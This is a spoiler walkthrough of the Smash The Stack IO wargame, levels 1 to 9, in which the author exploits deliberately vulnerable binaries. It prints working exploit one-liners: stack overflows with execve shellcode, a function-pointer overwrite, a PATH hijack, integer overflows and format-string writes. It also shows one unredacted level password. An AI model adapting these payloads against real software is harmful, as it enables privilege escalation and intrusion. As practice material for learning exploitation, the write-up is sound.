#Smash The Stack IO walkthrough

A little write-up about my findings on the StS IO wargame.
Spoilers ahead.

##Level 1

A binary, no source code.
When launched :

```
level1@io:/levels$ ./level01
Enter the 3 digit passcode to enter:
```

Having a look at the disassembly with `objdump -M intel -D level01 | less` :

```
08048080 <_start>:

8048080:       68 28 91 04 08          push   0x8049128
8048085:       e8 85 00 00 00          call   804810f <puts>
804808a:       e8 10 00 00 00          call   804809f <fscanf>
804808f:       3d 0f 01 00 00          cmp    eax,0x10f
8048094:       0f 84 42 00 00 00       je     80480dc <YouWin>
804809a:       e8 64 00 00 00          call   8048103 <exit>
```

Here is your number, at 0x804808f.

```
python -c "print(0x10f)"
271

Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
sh-4.2$ cat /home/level2/.pass
<redacted, passwords are rotated anyway>
```

##Level 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
        printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
	puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

Let's have a look at the situations where the SIGFPE signal is triggered. </br>
Courtesy of [SAS](http://support.sas.com/documentation/onlinedoc/sasc/doc700/html/lr1/zid-3511.htm) :

```
The SIGFPE signal is raised when a computational error occurs. These errors include floating-point overflow, floating-point underflow, and either integer- or floating-point division by 0.
```

Is there a way to cause a integer overflow just with integer division?
Division by 0 is not allowed.</br>
The range of signed 32bits integers is [-2147483648, 2147483647].

```
level2@io:/levels$ ./level02 2147483648 1
source code is available in level02.c

level2@io:/levels$ 
```

atoi seem to prevent the overflow, what if we generate INT_MAX+1 within the signed division? It cannot be represented using two's complement in a 32 bit register.

```
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c
WIN!
sh-4.2$ cat /home/level3/.pass
```


##Level 3
-------------

```
#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

So, the function pointer must be overflowed using a buffer we have control over.

With what value should the function pointer be overflowed?

```
(gdb) p good
$1 = {<text variable, no debug info>} 0x8048474 <good>
(gdb) p bad
$2 = {<text variable, no debug info>} 0x80484a4 <bad>
```

Let's fill the buffer with the 0x74 byte.
Now, it is just a matter of determining the right offset.
(Buffer offsets are sometimes padded some more by the compiler)

```
level3@io:/levels$ ./level03 $(python -c "print 76*'\x74'")
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
level3@io:/levels$ ./level03 $(python -c "print 77*'\x74'")
This is exciting we're going to 0x8048474
Win.
sh-4.2$ cat /home/level4/.pass
```

##Level 4


```
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

```
The popen() function opens a process by creating a pipe, forking, and invoking the shell.
```
Originally, I went with redirecting whoami with shell function aliases, but the challenge got updated and did not work anymore, so I changed the PATH environment variable instead.

```
level4@io:/tmp/tr$ PATH=/tmp/tr:$PATH
level4@io:/levels$ cat /tmp/tr/whoami 
#!/bin/sh
cat /home/level5/.pass
level4@io:/levels$ ./level04
Welcome DNLM3Vu0mZfX0pDd
```

##Level 5

Classic : a vanilla buffer overflow.
```
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[128];

	if(argc < 2) return 1;

	strcpy(buf, argv[1]);

	printf("%s\n", buf);	

	return 0;
}
```

First, let's find the offset at which the binary crashes.

```
(gdb) run $(python -c 'print("A"*143)')
Starting program: /levels/level05 $(python -c 'print("A"*143)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
(gdb) run $(python -c 'print("A"*144)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level05 $(python -c 'print("A"*144)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Seems we managed to overflow the return address saved on the stack with our input.
Our payload will be the following : [nop sled][shellcode][return address].

No ASLR here, so let's pick an address on the stack pointing to a nop in the buffer. One must be careful about the alignment of the code though.
The shellcode was picked at [the shell-storm shellcode repo](http://shell-storm.org/shellcode/files/shellcode-827.php).

```
./level05 $(python -c 'print("\x90"*117 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x10\xfe\xff\xbf")')
sh-4.2$ cat /home/level6/.pass
```

##Level 6

About the same as level5, but the 2 arguments are concatenated before filling the buffer.

```
LANG=de ./level06 $(python -c 'print("\x90"*40)') $(python -c 'print("\x90"*2 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xb1\xfb\xff\xbf")')
sh-4.2$ cat /home/level7/.pass
```

##Level 7
```
int main(int argc, char **argv)
{
        int count = atoi(argv[1]);
        int buf[10];

        if(count >= 10 )
                return 1;

        memcpy(buf, argv[2], count * sizeof(int));

        if(count == 0x574f4c46) {
                printf("WIN!\n");
                execl("/bin/sh", "sh" ,NULL);
        } else
                printf("Not today son\n");

        return 0;
}
```

Cannot go beyond 10 digits to overflow the buffer. Let's overflow `count * sizeof(int)` so we get the desired offset.

The `level7_findargv1` program looks for a suitable argv[1] so that 60 bytes can be copied to `buf`, and corrupt `count`.

```
level7@io:/levels$ /levels/level07 -1073741808 $(python -c 'print("3"*60) + "\x46\x4c\x4f\x57"')
sh-4.2$ cat /home/level8/.pass
```

##Level 8

Lost the password, but it involves C++ code with a function pointer method call that must be overwritten.

Find the virtual method table entry address, and overwrite its content with your target buffer address.

```
level8@io:/levels$ ./level08 $(python -c 'print("\x10\xa0\x04\x08"+"\x90"*72 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1" + "\x0c\xa0\x04\x08")')
sh-4.2$ id
uid=1008(level8) gid=1008(level8) euid=1009(level9) groups=1009(level9),1008(level8),1029(nosu)
sh-4.2$ cat /home/level9/.pass
```

##Level 9

Format string exploitation.
Stuck here. `sts_io_l9_format` was written so one can determine what to write at the target address.

```
b *0x80483e9
run $(python -c 'print("\xac\xfc\xff\xbf" + "\xae\xfc\xff\xbf" + "%16698c%4$n%65535c%5$n")') > eip = 0x41414142
run $(python -c 'print("\xac\xfc\xff\xbf" + "\xae\xfc\xff\xbf" + "%63654c%4$n%51025c%5$n"+"\xcc")') > eip = 0xbffff8ae

run $(python -c 'print("\x8c\xfc\xff\xbf" + "\x8e\xfc\xff\xbf" + "%63620c%4$n%51059c%5$n"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')

```
